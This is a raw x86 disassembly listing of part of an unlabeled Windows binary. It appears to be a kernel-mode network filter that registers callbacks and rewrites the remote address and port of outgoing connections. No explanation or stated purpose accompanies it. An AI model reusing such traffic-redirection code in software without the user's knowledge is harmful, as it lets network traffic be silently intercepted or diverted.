  404cf7:	ff 15 a0 70 40 00    	call   *0x4070a0
  404cfd:	8b c6                	mov    %esi,%eax
  404cff:	5e                   	pop    %esi
  404d00:	8b e5                	mov    %ebp,%esp
  404d02:	5d                   	pop    %ebp
  404d03:	c2 14 00             	ret    $0x14
  404d06:	cc                   	int3
  404d07:	cc                   	int3
  404d08:	cc                   	int3
  404d09:	cc                   	int3
  404d0a:	cc                   	int3
  404d0b:	cc                   	int3
  404d0c:	cc                   	int3
  404d0d:	cc                   	int3
  404d0e:	cc                   	int3
  404d0f:	cc                   	int3
  404d10:	55                   	push   %ebp
  404d11:	8b ec                	mov    %esp,%ebp
  404d13:	51                   	push   %ecx
  404d14:	8b 45 08             	mov    0x8(%ebp),%eax
  404d17:	53                   	push   %ebx
  404d18:	56                   	push   %esi
  404d19:	57                   	push   %edi
  404d1a:	85 c0                	test   %eax,%eax
  404d1c:	74 69                	je     0x404d87
  404d1e:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404d21:	85 db                	test   %ebx,%ebx
  404d23:	74 62                	je     0x404d87
  404d25:	8b 55 10             	mov    0x10(%ebp),%edx
  404d28:	85 d2                	test   %edx,%edx
  404d2a:	7e 5b                	jle    0x404d87
  404d2c:	80 38 00             	cmpb   $0x0,(%eax)
  404d2f:	74 56                	je     0x404d87
  404d31:	8b c8                	mov    %eax,%ecx
  404d33:	8b fb                	mov    %ebx,%edi
  404d35:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404d38:	f7 df                	neg    %edi
  404d3a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  404d40:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  404d43:	3b c2                	cmp    %edx,%eax
  404d45:	7d 40                	jge    0x404d87
  404d47:	8a 03                	mov    (%ebx),%al
  404d49:	38 01                	cmp    %al,(%ecx)
  404d4b:	75 30                	jne    0x404d7d
  404d4d:	33 f6                	xor    %esi,%esi
  404d4f:	84 c0                	test   %al,%al
  404d51:	74 24                	je     0x404d77
  404d53:	8b c3                	mov    %ebx,%eax
  404d55:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404d58:	8d 14 07             	lea    (%edi,%eax,1),%edx
  404d5b:	3b 55 10             	cmp    0x10(%ebp),%edx
  404d5e:	7d 0e                	jge    0x404d6e
  404d60:	8a 08                	mov    (%eax),%cl
  404d62:	3a 0c 1a             	cmp    (%edx,%ebx,1),%cl
  404d65:	75 07                	jne    0x404d6e
  404d67:	40                   	inc    %eax
  404d68:	46                   	inc    %esi
  404d69:	80 38 00             	cmpb   $0x0,(%eax)
  404d6c:	75 ea                	jne    0x404d58
  404d6e:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404d71:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404d74:	8b 55 10             	mov    0x10(%ebp),%edx
  404d77:	80 3c 1e 00          	cmpb   $0x0,(%esi,%ebx,1)
  404d7b:	74 15                	je     0x404d92
  404d7d:	41                   	inc    %ecx
  404d7e:	47                   	inc    %edi
  404d7f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404d82:	80 39 00             	cmpb   $0x0,(%ecx)
  404d85:	75 b9                	jne    0x404d40
  404d87:	5f                   	pop    %edi
  404d88:	5e                   	pop    %esi
  404d89:	33 c0                	xor    %eax,%eax
  404d8b:	5b                   	pop    %ebx
  404d8c:	8b e5                	mov    %ebp,%esp
  404d8e:	5d                   	pop    %ebp
  404d8f:	c2 0c 00             	ret    $0xc
  404d92:	5f                   	pop    %edi
  404d93:	5e                   	pop    %esi
  404d94:	8b c1                	mov    %ecx,%eax
  404d96:	5b                   	pop    %ebx
  404d97:	8b e5                	mov    %ebp,%esp
  404d99:	5d                   	pop    %ebp
  404d9a:	c2 0c 00             	ret    $0xc
  404d9d:	cc                   	int3
  404d9e:	cc                   	int3
  404d9f:	cc                   	int3
  404da0:	55                   	push   %ebp
  404da1:	8b ec                	mov    %esp,%ebp
  404da3:	6a 00                	push   $0x0
  404da5:	6a 00                	push   $0x0
  404da7:	6a 00                	push   $0x0
  404da9:	6a 00                	push   $0x0
  404dab:	ff 75 08             	push   0x8(%ebp)
  404dae:	ff 15 94 71 40 00    	call   *0x407194
  404db4:	5d                   	pop    %ebp
  404db5:	c2 04 00             	ret    $0x4
  404db8:	cc                   	int3
  404db9:	cc                   	int3
  404dba:	cc                   	int3
  404dbb:	cc                   	int3
  404dbc:	cc                   	int3
  404dbd:	cc                   	int3
  404dbe:	cc                   	int3
  404dbf:	cc                   	int3
  404dc0:	55                   	push   %ebp
  404dc1:	8b ec                	mov    %esp,%ebp
  404dc3:	81 ec 70 01 00 00    	sub    $0x170,%esp
  404dc9:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  404dce:	33 c5                	xor    %ebp,%eax
  404dd0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404dd3:	56                   	push   %esi
  404dd4:	8b 75 08             	mov    0x8(%ebp),%esi
  404dd7:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  404ddd:	6a 30                	push   $0x30
  404ddf:	6a 00                	push   $0x0
  404de1:	50                   	push   %eax
  404de2:	e8 e9 1a 00 00       	call   0x4068d0
  404de7:	83 c4 0c             	add    $0xc,%esp
  404dea:	c7 85 74 ff ff ff 01 	movl   $0x1,-0x8c(%ebp)
  404df1:	00 00 00 
  404df4:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  404dfa:	68 9c eb 40 00       	push   $0x40eb9c
  404dff:	50                   	push   %eax
  404e00:	6a 00                	push   $0x0
  404e02:	6a 0a                	push   $0xa
  404e04:	6a 00                	push   $0x0
  404e06:	e8 65 1a 00 00       	call   0x406870
  404e0b:	85 c0                	test   %eax,%eax
  404e0d:	0f 88 75 03 00 00    	js     0x405188
  404e13:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  404e18:	6a 00                	push   $0x0
  404e1a:	50                   	push   %eax
  404e1b:	e8 5c 1a 00 00       	call   0x40687c
  404e20:	85 c0                	test   %eax,%eax
  404e22:	0f 88 60 03 00 00    	js     0x405188
  404e28:	83 3d 9c eb 40 00 00 	cmpl   $0x0,0x40eb9c
  404e2f:	75 24                	jne    0x404e55
  404e31:	8b 0d 9c eb 40 00    	mov    0x40eb9c,%ecx
  404e37:	be 08 00 00 c0       	mov    $0xc0000008,%esi
  404e3c:	51                   	push   %ecx
  404e3d:	e8 46 1a 00 00       	call   0x406888
  404e42:	8b c6                	mov    %esi,%eax
  404e44:	5e                   	pop    %esi
  404e45:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e48:	33 cd                	xor    %ebp,%ecx
  404e4a:	e8 27 1e 00 00       	call   0x406c76
  404e4f:	8b e5                	mov    %ebp,%esp
  404e51:	5d                   	pop    %ebp
  404e52:	c2 04 00             	ret    $0x4
  404e55:	33 c0                	xor    %eax,%eax
  404e57:	c7 85 50 ff ff ff 00 	movl   $0x405200,-0xb0(%ebp)
  404e5e:	52 40 00 
  404e61:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404e67:	a1 68 72 40 00       	mov    0x407268,%eax
  404e6c:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
  404e72:	a1 6c 72 40 00       	mov    0x40726c,%eax
  404e77:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404e7d:	a1 70 72 40 00       	mov    0x407270,%eax
  404e82:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
  404e88:	a1 74 72 40 00       	mov    0x407274,%eax
  404e8d:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  404e93:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  404e99:	68 a0 eb 40 00       	push   $0x40eba0
  404e9e:	50                   	push   %eax
  404e9f:	56                   	push   %esi
  404ea0:	c7 85 54 ff ff ff f0 	movl   $0x4053f0,-0xac(%ebp)
  404ea7:	53 40 00 
  404eaa:	c7 85 58 ff ff ff e0 	movl   $0x4053e0,-0xa8(%ebp)
  404eb1:	53 40 00 
  404eb4:	e8 ab 19 00 00       	call   0x406864
  404eb9:	8b f0                	mov    %eax,%esi
  404ebb:	85 f6                	test   %esi,%esi
  404ebd:	79 1f                	jns    0x404ede
  404ebf:	8b 0d 9c eb 40 00    	mov    0x40eb9c,%ecx
  404ec5:	51                   	push   %ecx
  404ec6:	e8 bd 19 00 00       	call   0x406888
  404ecb:	8b c6                	mov    %esi,%eax
  404ecd:	5e                   	pop    %esi
  404ece:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404ed1:	33 cd                	xor    %ebp,%ecx
  404ed3:	e8 9e 1d 00 00       	call   0x406c76
  404ed8:	8b e5                	mov    %ebp,%esp
  404eda:	5d                   	pop    %ebp
  404edb:	c2 04 00             	ret    $0x4
  404ede:	6a 38                	push   $0x38
  404ee0:	8d 45 90             	lea    -0x70(%ebp),%eax
  404ee3:	6a 00                	push   $0x0
  404ee5:	50                   	push   %eax
  404ee6:	e8 e5 19 00 00       	call   0x4068d0
  404eeb:	a1 c2 6d 40 00       	mov    0x406dc2,%eax
  404ef0:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404ef3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404ef6:	8d 55 ec             	lea    -0x14(%ebp),%edx
  404ef9:	0f b7 05 c6 6d 40 00 	movzwl 0x406dc6,%eax
  404f00:	83 c4 0c             	add    $0xc,%esp
  404f03:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  404f07:	a1 c8 6d 40 00       	mov    0x406dc8,%eax
  404f0c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404f0f:	0f b7 05 cc 6d 40 00 	movzwl 0x406dcc,%eax
  404f16:	66 89 45 f0          	mov    %ax,-0x10(%ebp)
  404f1a:	a1 68 72 40 00       	mov    0x407268,%eax
  404f1f:	89 45 8c             	mov    %eax,-0x74(%ebp)
  404f22:	a1 6c 72 40 00       	mov    0x40726c,%eax
  404f27:	89 45 90             	mov    %eax,-0x70(%ebp)
  404f2a:	a1 70 72 40 00       	mov    0x407270,%eax
  404f2f:	89 45 94             	mov    %eax,-0x6c(%ebp)
  404f32:	a1 74 72 40 00       	mov    0x407274,%eax
  404f37:	89 45 98             	mov    %eax,-0x68(%ebp)
  404f3a:	a1 4c 72 40 00       	mov    0x40724c,%eax
  404f3f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  404f42:	a1 50 72 40 00       	mov    0x407250,%eax
  404f47:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404f4a:	a1 54 72 40 00       	mov    0x407254,%eax
  404f4f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404f52:	a1 58 72 40 00       	mov    0x407258,%eax
  404f57:	6a 00                	push   $0x0
  404f59:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404f5c:	8d 45 8c             	lea    -0x74(%ebp),%eax
  404f5f:	6a 00                	push   $0x0
  404f61:	50                   	push   %eax
  404f62:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  404f67:	50                   	push   %eax
  404f68:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  404f6b:	89 55 a0             	mov    %edx,-0x60(%ebp)
  404f6e:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%ebp)
  404f75:	e8 20 19 00 00       	call   0x40689a
  404f7a:	85 c0                	test   %eax,%eax
  404f7c:	0f 85 dc 01 00 00    	jne    0x40515e
  404f82:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  404f88:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  404f8e:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  404f94:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  404f9a:	a1 78 72 40 00       	mov    0x407278,%eax
  404f9f:	89 85 30 ff ff ff    	mov    %eax,-0xd0(%ebp)
  404fa5:	a1 7c 72 40 00       	mov    0x40727c,%eax
  404faa:	89 85 34 ff ff ff    	mov    %eax,-0xcc(%ebp)
  404fb0:	a1 80 72 40 00       	mov    0x407280,%eax
  404fb5:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
  404fbb:	a1 84 72 40 00       	mov    0x407284,%eax
  404fc0:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
  404fc6:	a1 ce 6d 40 00       	mov    0x406dce,%eax
  404fcb:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404fce:	66 a1 d2 6d 40 00    	mov    0x406dd2,%ax
  404fd4:	66 89 45 e8          	mov    %ax,-0x18(%ebp)
  404fd8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404fdb:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  404fe1:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404fe4:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%ebp)
  404fea:	b8 ff ff 00 00       	mov    $0xffff,%eax
  404fef:	66 89 85 58 ff ff ff 	mov    %ax,-0xa8(%ebp)
  404ff6:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  404ffc:	6a 00                	push   $0x0
  404ffe:	50                   	push   %eax
  404fff:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  405004:	50                   	push   %eax
  405005:	c7 45 c8 73 00 66 00 	movl   $0x660073,-0x38(%ebp)
  40500c:	c7 45 cc 72 00 00 00 	movl   $0x72,-0x34(%ebp)
  405013:	c7 85 48 ff ff ff 00 	movl   $0x0,-0xb8(%ebp)
  40501a:	00 00 00 
  40501d:	e8 6c 18 00 00       	call   0x40688e
  405022:	85 c0                	test   %eax,%eax
  405024:	0f 85 34 01 00 00    	jne    0x40515e
  40502a:	68 98 00 00 00       	push   $0x98
  40502f:	50                   	push   %eax
  405030:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  405036:	c7 85 90 fe ff ff ff 	movl   $0xffffffff,-0x170(%ebp)
  40503d:	ff ff ff 
  405040:	50                   	push   %eax
  405041:	c7 85 94 fe ff ff ff 	movl   $0xffffffff,-0x16c(%ebp)
  405048:	ff ff ff 
  40504b:	e8 80 18 00 00       	call   0x4068d0
  405050:	a1 d4 6d 40 00       	mov    0x406dd4,%eax
  405055:	83 c4 0c             	add    $0xc,%esp
  405058:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40505b:	a1 d8 6d 40 00       	mov    0x406dd8,%eax
  405060:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405063:	0f b7 05 dc 6d 40 00 	movzwl 0x406ddc,%eax
  40506a:	66 89 45 d8          	mov    %ax,-0x28(%ebp)
  40506e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405071:	89 85 a8 fe ff ff    	mov    %eax,-0x158(%ebp)
  405077:	a1 c8 6d 40 00       	mov    0x406dc8,%eax
  40507c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40507f:	0f b7 05 cc 6d 40 00 	movzwl 0x406dcc,%eax
  405086:	66 89 45 e0          	mov    %ax,-0x20(%ebp)
  40508a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40508d:	89 85 ac fe ff ff    	mov    %eax,-0x154(%ebp)
  405093:	a1 78 72 40 00       	mov    0x407278,%eax
  405098:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  40509e:	a1 7c 72 40 00       	mov    0x40727c,%eax
  4050a3:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
  4050a9:	a1 80 72 40 00       	mov    0x407280,%eax
  4050ae:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
  4050b4:	a1 84 72 40 00       	mov    0x407284,%eax
  4050b9:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  4050bf:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  4050c5:	89 85 e4 fe ff ff    	mov    %eax,-0x11c(%ebp)
  4050cb:	a1 4c 72 40 00       	mov    0x40724c,%eax
  4050d0:	89 85 c0 fe ff ff    	mov    %eax,-0x140(%ebp)
  4050d6:	a1 50 72 40 00       	mov    0x407250,%eax
  4050db:	89 85 c4 fe ff ff    	mov    %eax,-0x13c(%ebp)
  4050e1:	a1 54 72 40 00       	mov    0x407254,%eax
  4050e6:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
  4050ec:	a1 58 72 40 00       	mov    0x407258,%eax
  4050f1:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  4050f7:	a1 68 72 40 00       	mov    0x407268,%eax
  4050fc:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  405102:	a1 6c 72 40 00       	mov    0x40726c,%eax
  405107:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  40510d:	a1 70 72 40 00       	mov    0x407270,%eax
  405112:	89 85 fc fe ff ff    	mov    %eax,-0x104(%ebp)
  405118:	a1 74 72 40 00       	mov    0x407274,%eax
  40511d:	68 a8 eb 40 00       	push   $0x40eba8
  405122:	89 85 00 ff ff ff    	mov    %eax,-0x100(%ebp)
  405128:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  40512e:	6a 00                	push   $0x0
  405130:	50                   	push   %eax
  405131:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  405136:	50                   	push   %eax
  405137:	c7 85 f0 fe ff ff 03 	movl   $0x5003,-0x110(%ebp)
  40513e:	50 00 00 
  405141:	c7 85 e0 fe ff ff 04 	movl   $0x4,-0x120(%ebp)
  405148:	00 00 00 
  40514b:	c7 85 e8 fe ff ff 00 	movl   $0x0,-0x118(%ebp)
  405152:	00 00 00 
  405155:	e8 46 17 00 00       	call   0x4068a0
  40515a:	85 c0                	test   %eax,%eax
  40515c:	74 0b                	je     0x405169
  40515e:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  405163:	50                   	push   %eax
  405164:	e8 1f 17 00 00       	call   0x406888
  405169:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  40516e:	50                   	push   %eax
  40516f:	e8 0e 17 00 00       	call   0x406882
  405174:	8b f0                	mov    %eax,%esi
  405176:	85 f6                	test   %esi,%esi
  405178:	79 0c                	jns    0x405186
  40517a:	8b 0d a0 eb 40 00    	mov    0x40eba0,%ecx
  405180:	51                   	push   %ecx
  405181:	e8 e4 16 00 00       	call   0x40686a
  405186:	8b c6                	mov    %esi,%eax
  405188:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40518b:	33 cd                	xor    %ebp,%ecx
  40518d:	5e                   	pop    %esi
  40518e:	e8 e3 1a 00 00       	call   0x406c76
  405193:	8b e5                	mov    %ebp,%esp
  405195:	5d                   	pop    %ebp
  405196:	c2 04 00             	ret    $0x4
  405199:	cc                   	int3
  40519a:	cc                   	int3
  40519b:	cc                   	int3
  40519c:	cc                   	int3
  40519d:	cc                   	int3
  40519e:	cc                   	int3
  40519f:	cc                   	int3
  4051a0:	8b 0d 9c eb 40 00    	mov    0x40eb9c,%ecx
  4051a6:	85 c9                	test   %ecx,%ecx
  4051a8:	74 46                	je     0x4051f0
  4051aa:	8b 15 a8 eb 40 00    	mov    0x40eba8,%edx
  4051b0:	8b c2                	mov    %edx,%eax
  4051b2:	56                   	push   %esi
  4051b3:	8b 35 ac eb 40 00    	mov    0x40ebac,%esi
  4051b9:	0b c6                	or     %esi,%eax
  4051bb:	74 08                	je     0x4051c5
  4051bd:	56                   	push   %esi
  4051be:	52                   	push   %edx
  4051bf:	51                   	push   %ecx
  4051c0:	e8 e1 16 00 00       	call   0x4068a6
  4051c5:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  4051ca:	68 78 72 40 00       	push   $0x407278
  4051cf:	50                   	push   %eax
  4051d0:	e8 bf 16 00 00       	call   0x406894
  4051d5:	a1 a0 eb 40 00       	mov    0x40eba0,%eax
  4051da:	50                   	push   %eax
  4051db:	e8 8a 16 00 00       	call   0x40686a
  4051e0:	a1 9c eb 40 00       	mov    0x40eb9c,%eax
  4051e5:	5e                   	pop    %esi
  4051e6:	85 c0                	test   %eax,%eax
  4051e8:	74 06                	je     0x4051f0
  4051ea:	50                   	push   %eax
  4051eb:	e8 86 16 00 00       	call   0x406876
  4051f0:	c3                   	ret
  4051f1:	cc                   	int3
  4051f2:	cc                   	int3
  4051f3:	cc                   	int3
  4051f4:	cc                   	int3
  4051f5:	cc                   	int3
  4051f6:	cc                   	int3
  4051f7:	cc                   	int3
  4051f8:	cc                   	int3
  4051f9:	cc                   	int3
  4051fa:	cc                   	int3
  4051fb:	cc                   	int3
  4051fc:	cc                   	int3
  4051fd:	cc                   	int3
  4051fe:	cc                   	int3
  4051ff:	cc                   	int3
  405200:	55                   	push   %ebp
  405201:	8b ec                	mov    %esp,%ebp
  405203:	83 ec 70             	sub    $0x70,%esp
  405206:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40520b:	33 c5                	xor    %ebp,%eax
  40520d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405210:	8b 45 14             	mov    0x14(%ebp),%eax
  405213:	53                   	push   %ebx
  405214:	8b 5d 24             	mov    0x24(%ebp),%ebx
  405217:	56                   	push   %esi
  405218:	8b 75 0c             	mov    0xc(%ebp),%esi
  40521b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40521e:	8b 45 18             	mov    0x18(%ebp),%eax
  405221:	57                   	push   %edi
  405222:	8b 7d 08             	mov    0x8(%ebp),%edi
  405225:	89 45 a0             	mov    %eax,-0x60(%ebp)
  405228:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%ebp)
  40522f:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%ebp)
  405236:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%ebp)
  40523d:	ff 15 00 70 40 00    	call   *0x407000
  405243:	84 c0                	test   %al,%al
  405245:	0f 85 7b 01 00 00    	jne    0x4053c6
  40524b:	83 3d 1c a8 40 00 00 	cmpl   $0x0,0x40a81c
  405252:	0f 84 6e 01 00 00    	je     0x4053c6
  405258:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40525c:	0f 84 64 01 00 00    	je     0x4053c6
  405262:	f6 43 18 01          	testb  $0x1,0x18(%ebx)
  405266:	0f 84 5a 01 00 00    	je     0x4053c6
  40526c:	66 83 3f 42          	cmpw   $0x42,(%edi)
  405270:	8b 46 40             	mov    0x40(%esi),%eax
  405273:	8b 4e 44             	mov    0x44(%esi),%ecx
  405276:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  405279:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40527c:	c7 45 bc ff ff 00 00 	movl   $0xffff,-0x44(%ebp)
  405283:	0f 85 37 01 00 00    	jne    0x4053c0
  405289:	8b 4f 08             	mov    0x8(%edi),%ecx
  40528c:	8b f3                	mov    %ebx,%esi
  40528e:	c7 45 a4 04 00 00 00 	movl   $0x4,-0x5c(%ebp)
  405295:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  405298:	8b 41 14             	mov    0x14(%ecx),%eax
  40529b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40529e:	0f b7 41 24          	movzwl 0x24(%ecx),%eax
  4052a2:	8b 51 34             	mov    0x34(%ecx),%edx
  4052a5:	66 89 45 b0          	mov    %ax,-0x50(%ebp)
  4052a9:	0f b7 41 44          	movzwl 0x44(%ecx),%eax
  4052ad:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4052b2:	66 89 45 b2          	mov    %ax,-0x4e(%ebp)
  4052b6:	c7 03 02 10 00 00    	movl   $0x1002,(%ebx)
  4052bc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4052be:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  4052c1:	0f ca                	bswap  %edx
  4052c3:	8b 01                	mov    (%ecx),%eax
  4052c5:	8b 49 04             	mov    0x4(%ecx),%ecx
  4052c8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4052cb:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4052ce:	50                   	push   %eax
  4052cf:	52                   	push   %edx
  4052d0:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4052d3:	e8 d8 e5 ff ff       	call   0x4038b0
  4052d8:	8b f0                	mov    %eax,%esi
  4052da:	85 f6                	test   %esi,%esi
  4052dc:	0f 84 e4 00 00 00    	je     0x4053c6
  4052e2:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4052e5:	50                   	push   %eax
  4052e6:	6a 00                	push   $0x0
  4052e8:	ff 75 90             	push   -0x70(%ebp)
  4052eb:	e8 bc 15 00 00       	call   0x4068ac
  4052f0:	85 c0                	test   %eax,%eax
  4052f2:	0f 85 c8 00 00 00    	jne    0x4053c0
  4052f8:	8b 45 9c             	mov    -0x64(%ebp),%eax
  4052fb:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  4052fe:	8b 55 98             	mov    -0x68(%ebp),%edx
  405301:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  405304:	89 55 c8             	mov    %edx,-0x38(%ebp)
  405307:	0f ce                	bswap  %esi
  405309:	89 75 ac             	mov    %esi,-0x54(%ebp)
  40530c:	85 c0                	test   %eax,%eax
  40530e:	74 04                	je     0x405314
  405310:	66 89 45 b2          	mov    %ax,-0x4e(%ebp)
  405314:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405317:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%ebp)
  40531e:	50                   	push   %eax
  40531f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  405322:	50                   	push   %eax
  405323:	6a 00                	push   $0x0
  405325:	ff 75 d0             	push   -0x30(%ebp)
  405328:	ff 75 cc             	push   -0x34(%ebp)
  40532b:	52                   	push   %edx
  40532c:	51                   	push   %ecx
  40532d:	e8 8c 15 00 00       	call   0x4068be
  405332:	85 c0                	test   %eax,%eax
  405334:	75 6c                	jne    0x4053a2
  405336:	83 7d a4 04          	cmpl   $0x4,-0x5c(%ebp)
  40533a:	8b 55 a0             	mov    -0x60(%ebp),%edx
  40533d:	75 2e                	jne    0x40536d
  40533f:	8b 45 ac             	mov    -0x54(%ebp),%eax
  405342:	0f c8                	bswap  %eax
  405344:	89 82 84 00 00 00    	mov    %eax,0x84(%edx)
  40534a:	0f b7 45 b2          	movzwl -0x4e(%ebp),%eax
  40534e:	8a e8                	mov    %al,%ch
  405350:	8a cc                	mov    %ah,%cl
  405352:	66 89 8a 82 00 00 00 	mov    %cx,0x82(%edx)
  405359:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40535c:	0f c8                	bswap  %eax
  40535e:	89 42 04             	mov    %eax,0x4(%edx)
  405361:	0f b7 45 b0          	movzwl -0x50(%ebp),%eax
  405365:	8a e8                	mov    %al,%ch
  405367:	8a cc                	mov    %ah,%cl
  405369:	66 89 4a 02          	mov    %cx,0x2(%edx)
  40536d:	8b 45 bc             	mov    -0x44(%ebp),%eax
  405370:	6a 01                	push   $0x1
  405372:	89 82 08 01 00 00    	mov    %eax,0x108(%edx)
  405378:	ff 75 a0             	push   -0x60(%ebp)
  40537b:	ff 75 c8             	push   -0x38(%ebp)
  40537e:	ff 75 c4             	push   -0x3c(%ebp)
  405381:	e8 3e 15 00 00       	call   0x4068c4
  405386:	83 4d ec 01          	orl    $0x1,-0x14(%ebp)
  40538a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40538d:	50                   	push   %eax
  40538e:	6a 00                	push   $0x0
  405390:	ff 75 c8             	push   -0x38(%ebp)
  405393:	c7 45 d4 02 10 00 00 	movl   $0x1002,-0x2c(%ebp)
  40539a:	ff 75 c4             	push   -0x3c(%ebp)
  40539d:	e8 16 15 00 00       	call   0x4068b8
  4053a2:	ff 75 c8             	push   -0x38(%ebp)
  4053a5:	ff 75 c4             	push   -0x3c(%ebp)
  4053a8:	e8 05 15 00 00       	call   0x4068b2
  4053ad:	5f                   	pop    %edi
  4053ae:	5e                   	pop    %esi
  4053af:	5b                   	pop    %ebx
  4053b0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4053b3:	33 cd                	xor    %ebp,%ecx
  4053b5:	e8 bc 18 00 00       	call   0x406c76
  4053ba:	8b e5                	mov    %ebp,%esp
  4053bc:	5d                   	pop    %ebp
  4053bd:	c2 20 00             	ret    $0x20
  4053c0:	c7 03 02 10 00 00    	movl   $0x1002,(%ebx)
  4053c6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4053c9:	5f                   	pop    %edi
  4053ca:	5e                   	pop    %esi
  4053cb:	33 cd                	xor    %ebp,%ecx
  4053cd:	5b                   	pop    %ebx
  4053ce:	e8 a3 18 00 00       	call   0x406c76
  4053d3:	8b e5                	mov    %ebp,%esp
  4053d5:	5d                   	pop    %ebp
  4053d6:	c2 20 00             	ret    $0x20
  4053d9:	cc                   	int3
  4053da:	cc                   	int3
  4053db:	cc                   	int3
  4053dc:	cc                   	int3
  4053dd:	cc                   	int3
  4053de:	cc                   	int3
  4053df:	cc                   	int3
  4053e0:	c2 10 00             	ret    $0x10
  4053e3:	cc                   	int3
  4053e4:	cc                   	int3
  4053e5:	cc                   	int3
  4053e6:	cc                   	int3
  4053e7:	cc                   	int3
  4053e8:	cc                   	int3
  4053e9:	cc                   	int3
  4053ea:	cc                   	int3
  4053eb:	cc                   	int3
  4053ec:	cc                   	int3
  4053ed:	cc                   	int3
  4053ee:	cc                   	int3
  4053ef:	cc                   	int3
  4053f0:	33 c0                	xor    %eax,%eax
  4053f2:	c2 0c 00             	ret    $0xc
  4053f5:	cc                   	int3
  4053f6:	cc                   	int3
  4053f7:	cc                   	int3
  4053f8:	cc                   	int3
  4053f9:	cc                   	int3
  4053fa:	cc                   	int3
  4053fb:	cc                   	int3
  4053fc:	cc                   	int3
